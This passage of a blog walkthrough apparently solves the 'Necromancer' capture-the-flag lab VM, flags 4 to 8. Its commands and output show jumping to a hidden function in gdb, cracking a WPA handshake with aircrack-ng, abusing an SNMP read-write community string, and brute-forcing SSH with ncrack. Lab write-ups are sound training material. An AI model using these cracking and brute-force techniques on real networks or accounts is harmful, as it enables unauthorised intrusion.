class="line">   0x08048914 &lt;+1003&gt;:	mov    BYTE PTR [ebp-0xc8],0xc6</span><br><span class="line">   0x0804891b &lt;+1010&gt;:	mov    BYTE PTR [ebp-0xc7],0x9f</span><br><span class="line">   0x08048922 &lt;+1017&gt;:	mov    BYTE PTR [ebp-0xc6],0x5d</span><br><span class="line">   0x08048929 &lt;+1024&gt;:	mov    BYTE PTR [ebp-0xc5],0xcf</span><br><span class="line">   0x08048930 &lt;+1031&gt;:	mov    BYTE PTR [ebp-0xc4],0x8a</span><br><span class="line">   0x08048937 &lt;+1038&gt;:	mov    BYTE PTR [ebp-0xc3],0xd2</span><br><span class="line">   0x0804893e &lt;+1045&gt;:	mov    BYTE PTR [ebp-0xc2],0x1c</span><br><span class="line">   0x08048945 &lt;+1052&gt;:	mov    BYTE PTR [ebp-0xc1],0xa1</span><br><span class="line">   0x0804894c &lt;+1059&gt;:	mov    BYTE PTR [ebp-0x80],0xbf</span><br><span class="line">   0x08048950 &lt;+1063&gt;:	mov    BYTE PTR [ebp-0x7f],0xbc</span><br><span class="line">   0x08048954 &lt;+1067&gt;:	mov    BYTE PTR [ebp-0x7e],0x53</span><br><span class="line">   0x08048958 &lt;+1071&gt;:	mov    BYTE PTR [ebp-0x7d],0xd5</span><br><span class="line">   0x0804895c &lt;+1075&gt;:	mov    BYTE PTR [ebp-0x7c],0xdd</span><br><span class="line">   0x08048960 &lt;+1079&gt;:	mov    BYTE PTR [ebp-0x7b],0x9b</span><br><span class="line">   0x08048964 &lt;+1083&gt;:	mov    BYTE PTR [ebp-0x7a],0x52</span><br><span class="line">   0x08048968 &lt;+1087&gt;:	mov    BYTE PTR [ebp-0x79],0xc6</span><br><span class="line">   0x0804896c &lt;+1091&gt;:	mov    BYTE PTR [ebp-0x78],0x95</span><br><span class="line">   0x08048970 &lt;+1095&gt;:	mov    BYTE PTR [ebp-0x77],0x9a</span><br><span class="line">   0x08048974 &lt;+1099&gt;:	mov    BYTE PTR [ebp-0x76],0x5d</span><br><span class="line">   0x08048978 &lt;+1103&gt;:	mov    BYTE PTR [ebp-0x75],0xd1</span><br><span class="line">   0x0804897c &lt;+1107&gt;:	mov    BYTE PTR [ebp-0x74],0xc5</span><br><span class="line">   0x08048980 &lt;+1111&gt;:	mov    BYTE PTR [ebp-0x73],0x97</span><br><span class="line">   0x08048984 &lt;+1115&gt;:	mov    BYTE PTR [ebp-0x72],0x52</span><br><span class="line">   0x08048988 &lt;+1119&gt;:	mov    BYTE PTR [ebp-0x71],0xd2</span><br><span class="line">   0x0804898c &lt;+1123&gt;:	mov    BYTE PTR [ebp-0x70],0x9b</span><br><span class="line">   0x08048990 &lt;+1127&gt;:	mov    BYTE PTR [ebp-0x6f],0xf8</span><br><span class="line">   0x08048994 &lt;+1131&gt;:	mov    BYTE PTR [ebp-0x6e],0x36</span><br><span class="line">   0x08048998 &lt;+1135&gt;:	mov    BYTE PTR [ebp-0x6d],0xab</span><br><span class="line">   0x0804899c &lt;+1139&gt;:	mov    BYTE PTR [ebp-0x6c],0xbf</span><br><span class="line">   0x080489a0 &lt;+1143&gt;:	mov    BYTE PTR [ebp-0x6b],0xf2</span><br><span class="line">   0x080489a4 &lt;+1147&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489a7 &lt;+1150&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489ad &lt;+1156&gt;:	push   eax</span><br><span class="line">   0x080489ae &lt;+1157&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x080489b3 &lt;+1162&gt;:	add    esp,0x10</span><br><span class="line">   0x080489b6 &lt;+1165&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489b9 &lt;+1168&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489bf &lt;+1174&gt;:	add    eax,0x64</span><br><span class="line">   0x080489c2 &lt;+1177&gt;:	push   eax</span><br><span class="line">   0x080489c3 &lt;+1178&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x080489c8 &lt;+1183&gt;:	add    esp,0x10</span><br><span class="line">   0x080489cb &lt;+1186&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489ce &lt;+1189&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489d4 &lt;+1195&gt;:	add    eax,0xc8</span><br><span class="line">   0x080489d9 &lt;+1200&gt;:	push   eax</span><br><span class="line">   0x080489da &lt;+1201&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x080489df &lt;+1206&gt;:	add    esp,0x10</span><br><span class="line">   0x080489e2 &lt;+1209&gt;:	sub    esp,0x8</span><br><span class="line">   0x080489e5 &lt;+1212&gt;:	lea    eax,[ebp-0x1c]</span><br><span class="line">   0x080489e8 &lt;+1215&gt;:	push   eax</span><br><span class="line">   0x080489e9 &lt;+1216&gt;:	push   0x80495b0</span><br><span class="line">   0x080489ee &lt;+1221&gt;:	call   0x8048330 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080489f3 &lt;+1226&gt;:	add    esp,0x10</span><br><span class="line">   0x080489f6 &lt;+1229&gt;:	sub    esp,0xc</span><br><span class="line">   0x080489f9 &lt;+1232&gt;:	lea    eax,[ebp-0x1ac]</span><br><span class="line">   0x080489ff &lt;+1238&gt;:	add    eax,0x12c</span><br><span class="line">   0x08048a04 &lt;+1243&gt;:	push   eax</span><br><span class="line">   0x08048a05 &lt;+1244&gt;:	call   0x80484f4 &lt;myPrintf&gt;</span><br><span class="line">   0x08048a0a &lt;+1249&gt;:	add    esp,0x10</span><br><span class="line">   0x08048a0d &lt;+1252&gt;:	nop</span><br><span class="line">   0x08048a0e &lt;+1253&gt;:	mov    edi,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048a11 &lt;+1256&gt;:	leave  </span><br><span class="line">   0x08048a12 &lt;+1257&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x080482d0  _init</span><br><span class="line">0x08048310  printf@plt</span><br><span class="line">0x08048320  __libc_start_main@plt</span><br><span class="line">0x08048330  __isoc99_scanf@plt</span><br><span class="line">0x08048350  _start</span><br><span class="line">0x08048380  __x86.get_pc_thunk.bx</span><br><span class="line">0x08048390  deregister_tm_clones</span><br><span class="line">0x080483c0  register_tm_clones</span><br><span class="line">0x08048400  __do_global_dtors_aux</span><br><span class="line">0x08048420  frame_dummy</span><br><span class="line">0x0804844b  unhide</span><br><span class="line">0x0804849d  hide</span><br><span class="line">0x080484f4  myPrintf</span><br><span class="line">0x08048529  wearTalisman</span><br><span class="line">0x08048a13  main</span><br><span class="line">0x08048a37  chantToBreakSpell</span><br><span class="line">0x08049530  __libc_csu_init</span><br><span class="line">0x08049590  __libc_csu_fini</span><br><span class="line">0x08049594  _fini</span><br><span class="line"></span><br><span class="line">(gdb) break main</span><br><span class="line">Breakpoint 1 at 0x8048a21</span><br><span class="line"></span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /root/ctf/necromancer/talisman</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048a21 in main ()</span><br><span class="line">(gdb) jump chantToBreakSpell</span><br><span class="line">Continuing at 0x8048a3b.</span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">You fall to your knees.. weak and weary.</span><br><span class="line">Looking up you can see the spell is still protecting the cave entrance.</span><br><span class="line">The talisman is now almost too hot to touch!</span><br><span class="line">Turning it over you see words now etched into the surface:</span><br><span class="line">flag4&#123;ea50536158db50247e110a6c89fcf3d3&#125;</span><br><span class="line">Chant these words at u31337</span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">[Inferior 1 (process 10645) exited with code 0162]</span><br></pre></td></tr></table></figure>
<p>If you are wondering what happened here let me tell you. I disassembled the binary’s main function, which calls <code>wearTalisman</code> which is where the text we say earlier is printed (apparently gdb does not recognize this as a string which blows up the size of the function) but otherwise it does nothing interesting. <code>info functions</code> however revealed that there is a function called <code>chantToBreakSpell</code> which is neither called in <code>main</code> nor in <code>wearTalisman</code>, so I called it myself by breaking at the start of the program and consequently jumping to said function.</p>
<h3 id="5th-Flag-Throwback-time"><a href="#5th-Flag-Throwback-time" class="headerlink" title="5th Flag: Throwback time"></a>5th Flag: Throwback time</h3><p>The last flag came with sufficient instructions; we have to communicate with UDP port 31337 (aparently the Necromancer is fluent in leetspeak).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nmap -sU -p 31337 10.0.2.10</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 21:17 CET</span><br><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31337/udp open  BackOrifice</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds</span><br></pre></td></tr></table></figure>
<p>As expected the port is open and a service named BackOrifice sits behind it. I recognize the name from the early-mid 2000s, when me and a friend of mine used to experiment with it on LAN parties (without success due to seriously limited knowledge at that time). It’s an old school backdoor trojan. In this case I don’t expect it to be the real BackOrifice, since I only recall it running on Windows, not on BSD, the necromancer’s operating system of choice. Enough talk, let’s chant the words:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nc -u 10.0.2.10 31337</span><br><span class="line">ea50536158db50247e110a6c89fcf3d3Nothing happens.</span><br><span class="line">flag4&#123;ea50536158db50247e110a6c89fcf3d3&#125;Nothing happens.</span><br></pre></td></tr></table></figure>
<p>The only answer is <code>Nothing happens</code>, we don’t even get a newline. Like before on flag 2, I try the hash cracker again and receive the word <code>blackmagic</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# echo blackmagic | nc -u 10.0.2.10 31337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">As you chant the words, a hissing sound echoes from the ice walls.</span><br><span class="line"></span><br><span class="line">The blue aura disappears from the cave entrance.</span><br><span class="line"></span><br><span class="line">You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.</span><br><span class="line"></span><br><span class="line">You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.</span><br><span class="line"></span><br><span class="line">The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.</span><br><span class="line"></span><br><span class="line">Suddenly, you are attacked by a swarm of bats!</span><br><span class="line"></span><br><span class="line">You aimlessly thrash at the air in front of you!</span><br><span class="line"></span><br><span class="line">The bats continue their relentless attack, until.... silence.</span><br><span class="line"></span><br><span class="line">Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.</span><br><span class="line"></span><br><span class="line">Looking towards one of the torches, you see something on the cave wall.</span><br><span class="line"></span><br><span class="line">You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.</span><br><span class="line"></span><br><span class="line">/thenecromancerwillabsorbyoursoul</span><br><span class="line"></span><br><span class="line">flag5&#123;0766c36577af58e15545f099a3b15e60&#125;</span><br></pre></td></tr></table></figure>
<p>Same solution as last time.</p>
<h3 id="6th-Flag-Resulting-to-brute-force"><a href="#6th-Flag-Resulting-to-brute-force" class="headerlink" title="6th Flag: Resulting to brute force"></a>6th Flag: Resulting to brute force</h3><p>What awaits us at <code>http://10.0.2.10/thenecromancerwillabsorbyoursoul</code> is too long for a screenshot, but see for yourself:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> flag6&#123;b1c3ed8f1db4258e4dcb0ce565f6dc03&#125;</span><br><span class="line">You continue to make your way through the cave.</span><br><span class="line">In the distance you can see a familiar flicker of light moving in and out of the shadows.</span><br><span class="line">As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.</span><br><span class="line">You move closer, and then stop frozen with fear.</span><br><span class="line">It&apos;s the necromancer!</span><br></pre></td></tr></table></figure>
<img src="/2017/12/necromancer/necromancer.jpg" title="The Necromancer">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Again he stares at you with deathly hollow eyes.</span><br><span class="line">He is standing in a doorway; a staff in one hand, and an object in the other.</span><br><span class="line">Smirking, the necromancer holds the staff and the object in the air.</span><br><span class="line">He points his staff in your direction, and the stench of death and decay begins to fill the air.</span><br><span class="line">You stare into his eyes and then.......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.</span><br><span class="line">The amulet must have saved you from whatever spell the necromancer had cast.</span><br><span class="line">You stand to your feet. Behind you, only darkness.</span><br><span class="line">Before you, a large door with the symbol of a skull engraved into the surface.</span><br><span class="line">Looking closer at the skull, you can see u161 engraved into the forehead.</span><br></pre></td></tr></table></figure>
<h3 id="7th-Flag-Uncommon-services"><a href="#7th-Flag-Uncommon-services" class="headerlink" title="7th Flag: Uncommon services"></a>7th Flag: Uncommon services</h3><p>Spooky, but it seems we survived the encounter. In addition to the hint to UDP port 161 the necromancer links to the download of a binary file.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# file necromancer</span><br><span class="line">necromancer: bzip2 compressed data, block size = 900k</span><br><span class="line">root@kali:~/ctf/necromancer# mv necromancer necromancer.bz2</span><br><span class="line">root@kali:~/ctf/necromancer# bzip2 -d necromancer.bz2</span><br><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">necromancer</span><br><span class="line">root@kali:~/ctf/necromancer# file necromancer</span><br><span class="line">necromancer: POSIX tar archive (GNU)</span><br><span class="line">root@kali:~/ctf/necromancer# mv necromancer necromancer.tar</span><br><span class="line">root@kali:~/ctf/necromancer# tar xvf necromancer.tar</span><br><span class="line">necromancer.cap</span><br></pre></td></tr></table></figure>
<p>It’s a packet capture file which we can open with <code>wireshark</code>:</p>
<img src="/2017/12/necromancer/pcap.png" title="Packet Capture">
<p>It looks like wireless lan traffic and probably includes a handshake. Maybe we can extract (i.e. crack) the password and use it on the open UDP port.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">Opening necromancer.cap</span><br><span class="line">Read 2197 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening necromancer.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line"></span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line"></span><br><span class="line">      [00:00:06] 16128/9822768 keys tested (2439.42 k/s)</span><br><span class="line"></span><br><span class="line">      Time left: 1 hour, 7 minutes, 0 seconds                    0.16%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ death2all ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC</span><br><span class="line">                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7</span><br><span class="line"></span><br><span class="line">      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C</span><br><span class="line">                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3</span><br><span class="line">                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92</span><br><span class="line">                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D</span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E</span><br></pre></td></tr></table></figure>
<p>Using the biggest password list on Kali we were able to crack the password <code>death2all</code>. Now we can focus on the port.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nmap -sU -p 161 10.0.2.10</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 22:54 CET</span><br><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">161/udp open  snmp</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds</span><br></pre></td></tr></table></figure>
<p>The service we find is SNMP. A little bit of research reveals that it is the Simple Network Management Protocol, often used by routers or switches. I also found out that Kali comes with a related software to extract information from such a service called <code>snmpwalk</code> (which was a little bit tricky to understand):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# man snmpwalk</span><br><span class="line">root@kali:~/ctf/necromancer# snmpwalk -c death2all -v 1 10.0.2.10</span><br><span class="line">iso.3.6.1.2.1.1.1.0 = STRING: &quot;You stand in front of a door.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.4.0 = STRING: &quot;The door is Locked. If you choose to defeat me, the door must be Unlocked.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.5.0 = STRING: &quot;Fear the Necromancer!&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;Locked - death2allrw!&quot;</span><br><span class="line">End of MIB</span><br></pre></td></tr></table></figure>
<p>So it’s not that easy. At this point I almost gave up, as I did not understand SNMP well enough, but I guess it’s sometimes necessary to dive deep into uncommon protocols.</p>
<p>I guess the <code>snmp</code> equivalent of unlocking a door is setting the value of the “Locked…” string to something else. A specific value is probably needed so I read the <code>snmpwalk</code> output again and notice the unusual capitalization of “Unlocked”, which also happens to be a plausible value for the string.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# snmpset -c death2all -v 1 10.0.2.10 iso.3.6.1.2.1.1.6.0 string &quot;Unlocked&quot;</span><br><span class="line">Error in packet.</span><br><span class="line">Reason: (noSuchName) There is no such variable name in this MIB.</span><br><span class="line">Failed object: iso.3.6.1.2.1.1.6.0</span><br></pre></td></tr></table></figure>
<p>We probably do not have write access and by revisiting the previous output it is painfully obvious that the Necromancer has provided us with a community string that grants probably grants us this access (given that the <code>rw</code> in <code>death2allrw</code> stands for <code>read/write</code>). Let’s try again:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# snmpset -c death2allrw -v 1 10.0.2.10 iso.3.6.1.2.1.1.6.0 string &quot;Unlocked&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;Unlocked&quot;</span><br><span class="line">root@kali:~/ctf/necromancer# snmpwalk -c death2all -v 1 10.0.2.10</span><br><span class="line">iso.3.6.1.2.1.1.1.0 = STRING: &quot;You stand in front of a door.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.4.0 = STRING: &quot;The door is unlocked! You may now enter the Necromancer&apos;s lair!&quot;</span><br><span class="line">iso.3.6.1.2.1.1.5.0 = STRING: &quot;Fear the Necromancer!&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;flag7&#123;9e5494108d10bbd5f9e7ae52239546c4&#125; - t22&quot;</span><br><span class="line">End of MIB</span><br></pre></td></tr></table></figure>
<h3 id="8th-Flag-Mounting-the-offensive"><a href="#8th-Flag-Mounting-the-offensive" class="headerlink" title="8th Flag: Mounting the offensive"></a>8th Flag: Mounting the offensive</h3><p>It worked! The answer points to <code>tcp/22</code> (SSH) which looks like we are about to get shell access on the Necromancer machine. However, we need a username and password first and there is not hint other than the port and the flag. We can try to milk the flag again by reversing the <code>md5</code> hash online again, a recurring theme of the Necromancer’s flags. Doing so revealed that <code>demonslayer</code> was behind the hash. This does not look like a username/password combination, though. We can still try to use it as a username and crack the password. We use <code>hydra</code> for this, which would also allow us to use <code>demonslayer</code> as a password and brute force the user if the first approach does not work.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ncrack -p 22 --user demonslayer -P /usr/share/wordlists/rockyou.txt 10.0.2.10</span><br><span class="line"></span><br><span class="line">Starting Ncrack 0.6 ( http://ncrack.org ) at 2017-12-17 13:51 CEST</span><br><span class="line">Stats: 0:00:14 elapsed; 0 services completed (1 total)</span><br><span class="line">Rate: 43.67; Found: 1; About 0.00% done</span><br><span class="line">(press &apos;p&apos; to list discovered credentials)</span><br><span class="line">Discovered credentials for ssh on 10.0.2.10 22/tcp:</span><br><span class="line">10.0.2.10 22/tcp ssh: &apos;demonslayer&apos; &apos;12345678&apos;</span><br></pre></td></tr></table></figure>
<p>Almost instantly the password is discovered to be <code>12345678</code>, which we probably also would have been able to guess without <code>ncrack</code>. This password drops us right into demonslayer’s korn shell (<code>ksh</code>) after an impressive MOTD:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ssh demonslayer@10.0.2.10</span><br><span class="line">The authenticity of host &apos;10.0.2.10 (10.0.2.10)&apos; can&apos;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;10.0.2.10&apos; (ECDSA) to the list of known hosts.</span><br><span class="line">demonslayer@10.0.2.10&apos;s password:</span><br><span class="line"></span><br><span class="line">          .                                                      .</span><br><span class="line">        .n                   .                 .                  n.</span><br><span class="line">  .   .dP                  dP                   9b                 9b.    .</span><br><span class="line"> 4    qXb         .       dX                     Xb       .        dXp     t</span><br><span class="line">dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb</span><br><span class="line">9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP</span><br><span class="line"> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP</span><br><span class="line">  `9XXXXXXXXXXXXXXXXXXXXX&apos;~   ~`OOO8b   d8OOO&apos;~   ~`XXXXXXXXXXXXXXXXXXXXXP&apos;</span><br><span class="line">    `9XXXXXXXXXXXP&apos; `9XX&apos;          `98v8P&apos;          `XXP&apos; `9XXXXXXXXXXXP&apos;</span><br><span class="line">        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~</span><br><span class="line">                        )b.  .dbo.dP&apos;`v&apos;`9b.odb.  .dX(</span><br><span class="line">                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.</span><br><span class="line">                     dXXXXXXXXXXXP&apos;   .   `9XXXXXXXXXXXb</span><br><span class="line">                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb</span><br><span class="line">                    9XXb&apos;   `XXXXXb.dX|Xb.dXXXXX&apos;   `dXXP</span><br><span class="line">                     `&apos;      9XXXXXX(   )XXXXXXP      `&apos;</span><br><span class="line">                              XXXX X.`v&apos;.X XXXX</span><br><span class="line">                              XP^X&apos;`b   d&apos;`X^XX</span><br><span class="line">                              X. 9  `   &apos;  P )X</span><br><span class="line">                              `b  `       &apos;  d&apos;</span><br><span class="line">                               `             &apos;                       </span><br><span class="line">                               THE NECROMANCER!</span><br><span class="line">                                 by  @xerubus</span><br><span class="line"></span><br><span class="line">$ echo $0</span><br><span class="line">-ksh</span><br><span class="line">$ ls</span><br><span class="line">flag8.txt</span><br><span class="line">$ cat flag8.txt</span><br><span class="line">You enter the Necromancer&apos;s Lair!</span><br><span class="line"></span><br><span class="line">A stench of decay fills this place.</span><br><span class="line"></span><br><span class="line">Jars filled with parts of creatures litter the bookshelves.</span><br><span class="line"></span><br><span class="line">A fire with flames of green burns coldly in the distance.</span><br><span class="line"></span><br><span class="line">Standing in the middle of the room with his back to you is the Necromancer.</span><br><span class="line"></span><br><span class="line">In front of him lies a corpse, indistinguishable from any living creature you have seen before.</span><br><span class="line"></span><br><span class="line">He holds a staff in one hand, and the flickering object in the other.</span><br><span class="line"></span><br><span class="line">&quot;You are a fool to follow me here!  Do you not know who I am!&quot;</span><br><span class="line"></span><br><span class="line">The necromancer turns to face you.  Dark words fill the air!</span><br><span class="line"></span><br><span class="line">&quot;You are damned already my friend.  Now prepare for your own death!&quot;</span><br><span 